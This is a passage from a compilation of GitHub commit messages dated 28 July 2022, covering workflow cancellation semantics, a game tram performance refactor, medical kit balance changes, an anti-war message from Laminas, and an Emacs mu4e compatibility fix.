We are also not currently planning on making this configurable.  It's seen as a correction of an under-specified and somewhat flawed chunk of behavior, more than "a change".  
Existing workflows will not experience replay errors, but it is still a substantial *semantic* change, though from what we have seen cancellation is relatively rarely used (partly due to its complex behavior).  If issues are encountered / if users end up needing it, it should be fairly easy to add a per-domain/tasklist/workflow type configuration value, but it will be opt-*out*, not opt-*in*.

# What was happening

Previously, workflow behavior on cancellation was pretty frequently surprising to our users, arguably inconsistent, and not very well documented:

| **PREVIOUS**  | **simple**               | **retry**                                 | **cron**                                | **retry+cron**                                    |
|--------------:|--------------------------|-------------------------------------------|-----------------------------------------|---------------------------------------------------|
| **success**   | success                  | success                                   | success<br>continue cron<br>cron        | success<br>continue cron<br>cron<br>retry         |
| **cancel**    | canceled                 | canceled                                  | canceled                                | canceled                                          |
| **retryable** | (n/a, fatal)             | continue retry<br>retry<br>recorded error | (n/a, fatal)                            | continue retry<br>cron<br>retry<br>recorded error |
| **fatal**     | failed<br>recorded error | failed<br>recorded error                  | continue cron<br>cron<br>recorded error | continue cron<br>cron<br>retry<br>recorded error  |
| **continue**  | continue immediately     | continue immediately<br>retry             | continue immediately                    | continue immediately<br>retry                     |
| **timeout**   | timeout                  | continue retry<br>retry<br>recorded error | continue cron<br>cron<br>recorded error | continue retry<br>cron<br>retry<br>recorded error |

A legend is:
- success / etc shows the final state of the canceled run (success = completed with a value that can be retrieved)
- "continue X" covers what source is used to compute the next run's starting delay (cron, retry, or no delay)
- "cron" / "retry" shows whether or not cron/retry configuration is carried over to the new run
  - note that cron is lost by default with continue-as-new
- and "recorded error" is whether or not the returned error is saved in its entirety (type + reason + details)

This largely summarizes as "cancellation works when you end with the canceled-context error", say from `ctx.Err()`, otherwise it behaves like normal (or nearly) and many scenarios will start a new run.
That's somewhat reasonable, but it's fairly "fragile" (it depends on what you return, and there are *many* ways for code to return some other error), and most importantly it means *there is no reliable way to stop a workflow* except to terminate it.

That has severe consequences in at least two scenarios:
1. When termination is *unsafe*
2. When a parent workflow cancels a child by canceling its context

For 1, for manual cancellations it's potentially reasonable to just terminate a run that begins after a successful cancel... but in principle if you're using cancellation it implies that termination is *not* desired, and potentially not safe to do.  Canceling may result in a brand new run that immediately starts new behavior, leaving you with no safe window to terminate and not leave bad state lingering.  
So users wanting a safe way to stop a sequence of workflows have no reliable way to do so.

For 2, it puts parent+child workflows in an extremely awkward, and essentially unrecoverable scenario.  Cancellation is a *one time event*, and as far as the parent is concerned, if the child/its context is canceled, the child is canceled...  
...but if the child then starts a new run for *any* reason (retry, cron, reset, etc), that new run is no longer canceled.  The parent has no way to know this has happened, and has no way to *re*-cancel the new child, so it can easily lead to the collection of workflows getting into an impossible state that it never recovers from.

Both cases are able to lead to unreliable behavior which can only use termination to stop, and for which no "safe" option exists.

After reviewing some customer issues and desires and thinking about things, we've settled on "cancel should guarantee that things stop".  Not necessarily in a timely manner, but that's fine.  And if a workflow wants to run behavior longer or larger than its current run can achieve, it has a workaround: start a new (likely child) workflow to do the cleanup.

# What happens now

So that's what this PR does, in a minimal / to-be-polished way so we can start running it for our stuck users while we flesh out tests and change other behaviors.

Currently that means our cancellation behavior is now:

| **CURRENT**    | **simple**                                | **retry**                                 | **cron**                                  | **retry+cron**                            |
|--------------:|-------------------------------------------|-------------------------------------------|-------------------------------------------|-------------------------------------------|
| **success**   | success                                   | success                                   | success                                   | success                                   |
| **cancel**    | canceled                                  | canceled                                  | canceled                                  | canceled                                  |
| **retryable** | (n/a, fatal)                              | canceled<br>recorded error (details only) | (n/a, fatal)                              | canceled<br>recorded error (details only) |
| **fatal**     | canceled<br>recorded error (details only) | canceled<br>recorded error (details only) | canceled<br>recorded error (details only) | canceled<br>recorded error (details only) |
| **continue**  | canceled<br>(no details)                  | canceled<br>(no details)                  | canceled<br>(no details)                  | canceled<br>(no details)                  |
| **timeout**   | timeout                                   | timeout                                   | timeout                                   | timeout                                   |

And the new "details" entries cover whether or not an error's "details" (the custom encoded data, not reason or type) are saved.  Unfortunately the current cancellation event (and clients' API) does not allow recording all data, or any in some cases, so the original reason/message and error type are lost and are replaced with a canceled error.

Now, cancellation *always* ends workflows with the current run.  Returning a value will return that value, including in cron scenarios, timeouts are still timeouts (and they imply a possibly un-clean termination), and _all_ errors or attempts to continue-as-new will instead result in a canceled state.

# Future changes to make to finish this effort

With further changes to the clients and RPC/storage models, canceled errors will store more details about what was returned.  E.g. continue-as-new does not record what was *attempted* to be started, and other error types lose their "reason" (i.e. the message) and type but not details.  Pretty clearly this is sub-par, and we should be capable of reporting the actual return in full so it can be retrieved if needed.  This is also why returning a value now always ends in a completed state, so successful completions do not lose those values.

Prior to merging into master / a release, we may end up making this configurable (likely with a default of opt-out), to address both the sub-par information recording and the semantically-breaking behavior change.  Docs changes are also due, as well as some integration tests, client library changes (e.g. to make sure the test suite reflects the new behavior), etc.

Another gap to plug is that resetting a workflow does not "forward" the canceled state to the new run.  We should probably be treating cancellation like we do signals: cancel the new run if the current run is canceled.  This will ensure that you can reset a child and retain the parent's cancellation, so it'll very likely become the default behavior, but we'll allow overriding it.  Resets are manual actions, they can break the rules if desired.  And they can just manually cancel later if they decide they do want it.

And last and perhaps least: it's quite strange that continue-as-new does not retain cron config.  At least from the Go client.  I suspect it's just not adding to / pulling from the context correctly.

---
## [aCrockofSchmidt/100-Days-of-Code-Python](https://github.com/aCrockofSchmidt/100-Days-of-Code-Python)@[1123934025...](https://github.com/aCrockofSchmidt/100-Days-of-Code-Python/commit/1123934025939ad0986e33ee70f1bc2c17cb9275)
#### Thursday 2022-07-28 21:26:54 by aCrockofSchmidt

initial commit

What a gongshow this turned out to be.  The lesson videos are obviously getting dated as some of the free services used here have changed their online interface.  Fun.  And then the whole mess with environmental variables in windows vs mac was a pain in the ass.  Thank heavens some previous students figured out the corrections and posted in comments.  Very frustrating lesson and a growing trend of late, I'm afraid.

This stuff was almost entirely instructor driven.  The few challenges were minimal and relatively simple.

---
## [220620NET/We-Are-Losing-S-team-P2](https://github.com/220620NET/We-Are-Losing-S-team-P2)@[d7f6ea70f8...](https://github.com/220620NET/We-Are-Losing-S-team-P2/commit/d7f6ea70f814b4fb1a7707ff92157c67ca691a29)
#### Thursday 2022-07-28 21:39:13 by TheFakeLorLyons

fixing my horrible mistakes. Please forgive me and may God have mercy on my soul.

---
## [Jacquerel/orbstation](https://github.com/Jacquerel/orbstation)@[8f0df7816b...](https://github.com/Jacquerel/orbstation/commit/8f0df7816bae3c5dedf599611cda3e6039024e14)
#### Thursday 2022-07-28 21:49:52 by Kylerace

(code bounty) The tram is now unstoppably powerful. it cannot be stopped, it cannot be slowed, it cannot be reasoned with. YOU HAVE NO IDEA HOW READY YOU ARE (#66657)

ever see the tram take 10 milliseconds per movement to move 2100 objects? now you have
https://user-images.githubusercontent.com/15794172/166198184-8bab93bd-f584-4269-9ed1-6aee746f8f3c.mp4
About The Pull Request

fixes #66887

done for the code bounty posted by @MMMiracles to optimize the tram so that it can be sped up. the tram is now twice as fast, firing every tick instead of every 2 ticks. and is now around 10x cheaper to move. also adds support for multiz trams, as in trams that span multiple z levels.

the tram on master takes around 10-15 milliseconds per movement with nothing on it other than its starting contents. why is this? because the tram is the canary in the coal mines when it comes to movement code, which is normally expensive as fuck. the tram does way more work than it needs to, and even finds new ways to slow the game down. I'll walk you through a few of the dumber things the tram currently does and how i fixed them.

    the tram, at absolute minimum, has to move 55 separate industrial_lift platforms once per movement. this means that the tram has to unregister its entered/exited signals 55 times when "the tram" as a singular object is only entering 5 new turfs and exiting 5 old turfs every movement, this means that each of the 55 platforms calculates their own destination turfs and checks their contents every movement. The biggest single optimization in this pr was that I made the tram into a single 5x11 multitile object and made it only do entering/exiting checks on the 5 new and 5 old turfs in each movement.
    way too many of the default tram contents are expensive to move for something that has to move a lot. fun fact, did you know that the walls on the tram have opacity? do you know what opacity does for movables? it makes them recalculate static lighting every time they move. did you know that the tram, this entire time, was taking JUST as much time spamming SSlighting updates as it was spending time in SStramprocess? well it is! now it doesnt do that, the walls are transparent. also, every window and every grille on the tram had the atmos_sensitive element applied to them which then added connect_loc to them, causing them to update signals every movement. that is also dumb and i got rid of that with snowflake overrides. Now we must take care to not add things that sneakily register to Moved() or the moved signal to the roundstart tram, because that is dumb, and the relative utility of simulating objects that should normally shatter due to heat and conduct heat from the atmosphere is far less than the cost of moving them, for this one object.
    all tram contents physically Entered() and Exited() their destination and old turfs every movement, even though because they are on a tram they literally do not interact with the turf, the tram does. also, any objects that use connect_loc or connect_loc behalf that are on the same point on the tram also interact with each other because of this. now all contents of the tram act as if theyre being abstract_move()'d to their destination so that (almost) nothing thats in the destination turf or the exit turf can react to the event of "something laying on the tram is moving over you". the rare things that DO need to know what is physically entering or exiting their turf regardless of whether theyre interacting with the ground can register to the abstract entered and exited signals which are now always sent.
    many of the things hooked into Moved(), whether it be overrides of Moved() itself, or handlers for the moved signal, add up to a LOT of processing time. especially for humans. now ive gotten rid of a lot of it, mostly for the tram but also for normal movement. i made footsteps (a significant portion of human movement cost) not do any work if the human themselves didnt do the movement. i optimized has_gravity() a fair amount, and then realized that since everything on the tram isnt changing momentum, i didnt actually need to check gravity for the purposes of drifting (newtonian_move() was taking a significant portion of the cost of movement at some points along the development process). so now it simply doesnt call newtonian_move() for movements that dont represent a change in momentum (by default all movements do).

also i put effort into 1. better organizing tram/lift code so that most of it is inside of a dedicated modules folder instead of scattered around 5 generic folders and 2. moved a lot of behavior from lift platforms themselves into their lift_master_datum since ideally the platforms would just handle moving themselves, while any behavior involving the entire lift such as "move to destination" and "blow up" would be handled by the lift_master_datum.

also
https://user-images.githubusercontent.com/15794172/166220129-ff2ea344-442f-4e3e-94f0-ec58ab438563.mp4
multiz tram (this just adds the capability to map it like this, no tram does this)
Actual Performance Differences

to benchmark this, i added a world.Profile(PROFILER_START) and world.Profile(PROFILER_START) to the tram moving, so that it generates a profiler output of all tram movement without any unrelated procs being recorded (except for world.Profile() overhead). this made it a lot easier to quantify what was slowing down both the tram and movement in general. and i did 3 types of tests on both master and my branch.

also i should note that i sped up the "master" tram test to move once per tick as well, simply because the normal movement speed seems unbearably slow now. so all recorded videos are done at twice the speed of the real tram on master. this doesnt affect the main thing i was trying to measure: cost for each movement.

the first test was the base tram, containing only my player mob and the movables starting on the tram roundstart. on master, this takes around 13 milliseconds or so on my computer (which is pretty close to what it takes on the servers), on this branch, it takes between 0.9-1.3 milliseconds.

ALSO in these benchmarks youll see that tram/proc/travel() will vary significantly between the master and optimized branches. this is 100% because there are 55 times more platforms moving on master compared to the master branch, and thus 55x more calls to this proc. every test was recorded with the exact same amount of distance moved

here are the master and optimized benchmark text files:
master
master base tram.txt
https://user-images.githubusercontent.com/15794172/166210149-f118683d-6f6d-4dfb-b9e4-14f17b26aad8.mp4
also this shows the increased SSlighting usage resulting from the tram on master spamming updates, which doesnt happen on the optimized branch

optimized
optimization base tram.txt
https://user-images.githubusercontent.com/15794172/166206280-cd849aaa-ed3b-4e2f-b741-b8a5726091a9.mp4

the second test is meant to benchmark the best case scaling cost of moving objects, where nothing extra is registered to movement besides the bare minimum stuff on the /atom/movable level. Each of the open tiles of the tram had 1 bluespace rped filled with parts dumped onto it, to the point that the tram in total was moving 2100 objects. the vast majority of these objects did nothing special in movement so they serve as a good base case. only slightly off due to the rped's registering to movement.

on master, this test takes over 100 milliseconds per movement
master 2000 obj's.txt
https://user-images.githubusercontent.com/15794172/166210560-f4de620d-7dc6-4dbd-8b61-4a48149af707.mp4

when optimized, about 10 milliseconds per movement
https://user-images.githubusercontent.com/15794172/166208654-bc10086b-bbfc-49fa-9987-d7558109cc1d.mp4
optimization 2000 obj's.txt

the third test is 300 humans spawned onto the tram, meant to test all the shit added on to movement cost for humans/carbons. in retrospect this test is actually way too biased in favor of my optimizations since the humans are all in only 3 tiles, so all 100 humans on a tile are reacting to the other 99 humans movements, which wouldnt be as bad if they were distributed across 20 tiles like in the second test. so dont read into this one too hard.

on master, this test takes 200 milliseconds
master 300 catgirls.txt

when optimized, this takes about 13-14 milliseconds.
optimization 300 catgirls on ram ranch.txt
Why It's Good For The Game

the tram is literally 10x cheaper to move. and the code is better organized.
currently on master the tram is as fast as running speed, meaning it has no real relative utility compared to just running the tracks (except for the added safety of not having to risk being ran over by the tram). now the tram of which we have an entire map based around can be used to its full potential.

also, has some fixes to things on the tram reacting to movement. for example on master if you are standing on a tram tile that contains a banana and the TRAM moves, you will slip if the banana was in that spot before you (not if you were there first however). this is because the banana has no concept of relative movement, you and it are in the same reference frame but the banana, which failed highschool physics, believes you to have moved onto it and thus subjected you to the humiliation of an unjust slipping. now since tram contents that dont register to abstract entered/exited cannot know about other tram contents on the same tile during a movement, this cannot happen.

also, you no longer make footstep sounds when the tram moves you over a floor
TODO

mainly opened it now so i can create a stopping point and attend to my other now staling prs, we're at a state of functionality far enough to start testmerging it anyways.

add a better way for admins to be notified of the tram overloading the server if someone purposefully stuffs it with as much shit as they can, and for admins to clear said shit.
automatically slow down the tram if SStramprocess takes over like, 10 milliseconds complete. the tram still cant really check tick and yield without introducing logic holes, so making sure it doesnt take half of the tick every tick is important
go over my code to catch dumb shit i forgot about, there always is for these kinds of refactors because im very messy
remove the area based forced_gravity optimization its not worth figuring out why it doesnt work
fix the inevitable merge conflict with master lol
create an icon for the tram_tunnel area type i made so that objects on the tram dont have to enter and exit areas twice in a cross-station traversal

    add an easy way to vv tram lethality for mobs/things being hit by it. its an easy target in another thing i already wanted to do: a reinforced concept of shared variables from any particular tram platform and the entire tram itself. admins should be able to slow down the tram by vv'ing one platform and have it apply to the entire tram for example.

Changelog

cl
balance: the tram is now twice as fast, pray it doesnt get any faster (it cant without raising world fps)
performance: the tram is now about 10 times cheaper to move for the server
add: mappers can now create trams with multiple z levels
code: industrial_lift's now have more of their behavior pertaining to "the entire lift" being handled by their lift_master_datum as opposed to belonging to a random platform on the lift.
/cl

---
## [Stutternov/sojourn-station](https://github.com/Stutternov/sojourn-station)@[ef4665ec90...](https://github.com/Stutternov/sojourn-station/commit/ef4665ec90474cf5ac5f6aff34b6fd30e365429d)
#### Thursday 2022-07-28 21:51:09 by DimmaDunk

I HATE LIVERMED, I HATE LIVERMED, I HATE LIVERMED!!! (#3714)

* Makes combat medical kits better

- Replaces Dylovene pill bottle on Combat Medical Kit with Carthatoline pill bottle, as every chem inside it already WAS an upgrade over their normal counterparts, making it better at halting toxins damage and preventing liver from killing you. Also adds a Sanguinum syrette to stave off massive bloodloss which would cause the former as well.
- Replaces one of the Quicklot syrettes with a Sanguinum syrette on the Oxygen Deprivation First Aid Kit for better treatment of causes of oxyloss.
- Standardizes pill icons based on chem colors across all pre-built pills for easier reognition.
- Guarantees the "skill issue/salt PR" tag since it doesn't fix underlying issues of current medical system

* Adds carthatoline pills to deferred and corpsman large kit

Keeping in line with the rest of the PR.

* Blood regen pills!

- Adds pre-made Ferritin-Hemosiderin pills composed of iron and protein to help regenerate lost blood
- Replaces Sanguinum syrette on combat kit with ferritin-hemosiderin pill bottle
- Combat surgery kits now really hold advanced tools (except bone gel since the adv version is Soteria made)
- Makes the advanced bone gel item description not a copypaste of its stock counterpart

* Forgot a comma

Damn my haste.

---
## [jkunimune/elastik](https://github.com/jkunimune/elastik)@[b2abdfb7aa...](https://github.com/jkunimune/elastik/commit/b2abdfb7aac0acecbe673638d9118a1659998221)
#### Thursday 2022-07-28 22:27:30 by Justin Kunimune

sparsely populated

I implemented sparse arrays.  they are extremely slow when implemented in python, as it turns out.  it looks like to acheve my dream, I'll need to turn to ctypes after all (well, or rite it in Java, but I think it's a little late for that).  oh well.  should be an interesting learning experience.

---
## [allansun/laminas-code](https://github.com/allansun/laminas-code)@[d484b2a47a...](https://github.com/allansun/laminas-code/commit/d484b2a47a89f1487f55c0b7a79225a1cacd585a)
#### Thursday 2022-07-28 22:28:15 by Michał Bundyra

Message against the war, in Russian and English

🇷🇺 Русским гражданам

Мы, участники Laminas, родились и живем в разных странах. У многих из нас есть друзья, родственники и коллеги как в России, так и в Украине. Некоторые из нас родились в России. Некоторые из нас живут в России. У некоторых бабушки и дедушки сражались с фашистами во Второй мировой войне. Здесь никто не поддерживает фашизм.

У одного из нас есть украинская родственница, которая спаслась из дома вместе с сыном. Поезд задержался из-за бомбежки на дороге впереди. У нас есть друзья, которые прячутся в бомбоубежищах. Мы с тревогой ждем весточки от них после воздушных налетов, которые беспорядочно наносят удары и попадают по больницам, школам, детским садам и домам. Мы не берем это из каких-либо СМИ. Мы наблюдаем это напрямую.

Вы доверяете нам достаточно, чтоб использовать наши программы, и мы просим вас довериться нам вновь. Мы нуждаемся в помощи. Выходите и протестуйте против этой бесполезной войны. Остановите кровопролитие. Скажите "Нет войне!"

🇺🇸 To Citizens of Russia

We at Laminas come from all over the world. Many of us have friends, family and colleagues in both Russia and Ukraine. Some of us were born in Russia. Some of us currently live in Russia. Some have grandparents who fought Nazis in World War II. Nobody here supports fascism.

One team member has a Ukrainian relative who fled her home with her son. The train was delayed due to bombing on the road ahead. We have friends who are hiding in bomb shelters. We anxiously follow up on them after the air raids, which indiscriminately fire at hospitals, schools, kindergartens and houses. Were not taking this from any media. These are our actual experiences.

You trust us enough to use our software. We ask that you trust us to say the truth on this. We need your help. Go out and protest this unnecessary war. Stop the bloodshed. Say "stop the war!"

Signed-off-by: Michał Bundyra <contact@webimpress.com>

---
## [JoeBidenWhatAreYouHiding/kx](https://github.com/JoeBidenWhatAreYouHiding/kx)@[0fa0286c3c...](https://github.com/JoeBidenWhatAreYouHiding/kx/commit/0fa0286c3c7ed7049b7663f7409e1dfed3ae3081)
#### Thursday 2022-07-28 22:29:36 by AmCath

wab is now all of new england expect nyc cuz fuck you

---
## [79XiaoVM/doom-emacs](https://github.com/79XiaoVM/doom-emacs)@[b07614037f...](https://github.com/79XiaoVM/doom-emacs/commit/b07614037f7670682d2c193d83abdb9eed9f218e)
#### Thursday 2022-07-28 23:25:30 by TEC

fix(mu4e): support mu 1.8

Thanks to some combination of ignorance and obstinance, mu4e has thrown
compatibility to the wind and completely ignored the exitance of
define-obsolete-function-alias. Coupled with the inconsistent/partial
function renaming, this has made the mu4e 1.6⟶1.8 change particularly
annoying to deal with.

By suffering the pain of doing the mu4e author's work for them, we can
use defalias to give backwards compatibility a good shot for about 60
functions. Some mu4e~x functions are now mu4e--x, others are unchanged,
and then you've got a few odd changes like mu4e~proc -> mu4e--server and
mu4e-search-rerun. The form of message :from entries has also changed,
and a new (mu4e) entrypoint added supplanting mu4e~start.

Fix: #6511
Close: #6549
Co-authored-by: Rahguzar <aikrahguzar@gmail.com>

---

